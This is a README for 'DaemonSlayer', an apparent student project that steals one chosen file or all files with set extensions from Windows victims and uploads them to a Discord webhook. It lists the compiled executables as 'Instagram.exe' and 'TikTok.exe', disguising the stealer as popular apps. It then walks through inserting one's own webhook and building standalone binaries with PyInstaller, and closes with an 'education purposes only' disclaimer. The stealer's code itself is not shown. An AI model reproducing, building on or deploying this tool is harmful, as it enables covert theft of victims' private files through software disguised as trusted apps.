<p align="center">
  <img src="readme.gif" alt="animated" />
</p>
<h1 align="center">DaemonSlayer</h1>
## Project description

[![report](https://img.shields.io/static/v1.svg?label=documentation&message=Report&logo=microsoft-word&color=bluel)](https://binusianorg-my.sharepoint.com/personal/kimberly_mazel_binus_ac_id/_layouts/15/guestaccess.aspx?docid=0733469a87b264bd8bba28f95f37329dc&authkey=AQZeiY8xSWNUVGelE0nvddg&e=FqUX43)
[![Video](https://img.shields.io/static/v1?label=documentation&message=Video&color=blue)](https://binusianorg-my.sharepoint.com/personal/alysha_maulidina_binus_ac_id/_layouts/15/guestaccess.aspx?docid=0d8879a19f7e8428b96bf5b1ca10b537f&authkey=AWOORrkyFVlzrNK3njiUadw&e=eovFsT)
[![PPT](https://img.shields.io/static/v1.svg?label=Project&message=PPT&logo=microsoft-powerpoint&color=blue)](https://binusianorg-my.sharepoint.com/personal/kimberly_mazel_binus_ac_id/_layouts/15/guestaccess.aspx?docid=0b1e45d3f25fd4dd58f6c4b6bfa53b2fd&authkey=Abow1YWPzJb5utTrTJcjOTA&e=M5zIJl)

DaemonSlayer is designed to steal a specific file or all files from the victim's computer and stores them in a Discord WebHook. Its name originates from the hit manga and anime series ‘Demon Slayer’. The first half of its name, ‘Daemon’, defines a computer program that runs as a background process instead of being under the direct control of the user.


### Target
Users of Windows 10+.

### Contributors
1. Alysha Maulidina - Code Implementation
2. Kimberly Mazel - Documentation

### Directory
1. `daemonSlayer.py`: This file is to retrieve on specific file.
2. `daemonSlayer2.py`: This file is to retrieve ALL files, according to the set list of file extensions.
3. `dist`: Folder containing the executable files; `Instagram.exe` for `daemonSlayer.py` and `TikTok.exe` for `daemonSlayer2.py`.

## Showcase
![image](https://i.ibb.co/jTsWHMB/image.png)
![demo gif](https://github.com/alyshapm/DaemonSlayer/blob/main/demo.gif)


## Getting started
1. Clone this repo.
```bash
git clone https://github.com/alyshapm/DaemonSlayer
```
2. Replace `WEBHOOK_URL` in `daemonSlayer.py` and `daemonSlayer2.py` to your own WebHook URL.
3. In `daemonSlayer.py`, change the file name to whatever you would like to retrieve.
4. Compile the executables
```bash
pip install pyinstaller
pyinstaller --onefile daemonSlayer.py
pyinstaller --onefile daemonSlayer2.py
```
and any user will be able to run the files without Python isntaled.

## Warning
This program is for education purposes only. Use at your own risk and discretion. We do not take responsibility for the damage caused or misconduct used with this program.
